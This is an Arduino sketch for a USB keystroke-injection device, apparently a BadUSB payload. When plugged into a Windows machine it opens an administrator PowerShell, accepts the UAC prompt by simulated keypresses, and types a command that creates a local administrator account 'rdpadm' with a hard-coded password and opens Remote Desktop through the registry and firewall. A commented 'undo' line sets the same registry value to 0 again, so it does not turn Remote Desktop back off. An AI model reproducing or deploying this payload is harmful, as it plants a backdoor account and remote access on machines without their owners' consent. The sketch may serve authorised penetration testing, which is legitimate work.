#include <Arduino.h>
#include <DigiKeyboardMultilang.h>
#include <extendedLanguages.h>  // ExtendedLanguages - provides lang_de, lang_fr, lang_gr so far

DigiKeyboardMultilang keyboard(lang_de); // IMPORTANT Declare keyboard layout! e.g., lang_us for US English

const char* runCmdPld = "New-LocalUser 'rdpadm'-Password (ConvertTo-SecureString 'R3M07@2W1n!' -AsPlainText -Force) -PasswordNeverExpires; Add-LocalGroupMember -Group 'Administrators' -Member 'rdpadm'; Add-LocalGroupMember -Group 'Remote Desktop Users' -Member 'rdpadm';Set-Item 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\fDenyTSConnections' 0; Enable-NetFirewallRule -DisplayGroup 'Remote Desktop';exit"; 
// Create an RDP admin account and enable RDP & Undo with the command: Remove-LocalUser rdpadm;Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0; Disable-NetFirewallRule -DisplayGroup 'Remote Desktop';

int redLED = 1;

void setup() {
    pinMode(redLED, OUTPUT); // Initialize the RED LED pin as an output
    digitalWrite(redLED, HIGH); // Turn on the RED LED while executing payload
    
    // --- THE HID INJECTION STARTS HERE ---
    keyboard.delay(6000); // Wait 6 seconds to allow the OS to recognize the device and install drivers if needed
    keyboard.sendKeyStroke(KEY_X, 0x08); // Win+x (0x08 = Left GUI/Windows key modifier)
    keyboard.delay(800); // Wait 0.8 seconds for the selection menu dialog to open
    keyboard.println("a"); // select to Open an administrator PowerShell window from the menu
    keyboard.delay(800); // Wait 0.8 seconds for the browser to open
    keyboard.sendKeyStroke(KEY_LEFT); // Move to the yes button in the UAC prompt
    keyboard.delay(300); // Wait 0.3 seconds for the browser to open
    keyboard.sendKeyStroke(KEY_ENTER); // press Enter to accept UAC prompt
    keyboard.delay(3000); // Wait 3 seconds for the powershell terminal to open
    keyboard.println(runCmdPld); // run the powershell payload as an admin.
    // --- THE HID INJECTION ENDS HERE ---
    
    digitalWrite(redLED, LOW); // Turn off the RED LED after executing payload
}

void loop() {
    // the loop function is intentionally left empty But if you want to repeat the payload,
    // you can add code here with your desired logic and delays instead of in setup().
}